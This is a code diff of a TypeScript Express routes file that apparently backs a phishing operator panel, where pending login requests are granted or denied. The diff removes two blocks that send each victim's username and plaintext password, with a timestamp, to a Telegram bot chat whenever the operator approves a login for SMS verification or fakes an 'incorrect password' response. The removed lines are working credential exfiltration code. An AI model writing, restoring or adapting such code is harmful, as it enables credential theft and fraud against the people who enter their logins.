@@ -234,21 +234,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
         request.status = 'granted';
         pendingRequests.set(requestId, request);
       }
-      
-      // Send grant notification to Telegram
-      const message = `✅ LOGIN GRANTED\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}\n📋 Action: Approved for SMS verification`;
-      
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'HTML'
-        })
-      });
 
       res.json({
         success: true,
@@ -273,21 +258,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
         request.status = 'denied';
         pendingRequests.set(requestId, request);
       }
-      
-      // Send deny notification to Telegram
-      const message = `❌ LOGIN DENIED\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}\n📋 Action: Denied - showing "incorrect password"`;
-      
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'HTML'
-        })
-      });
 
       res.json({
         success: true,
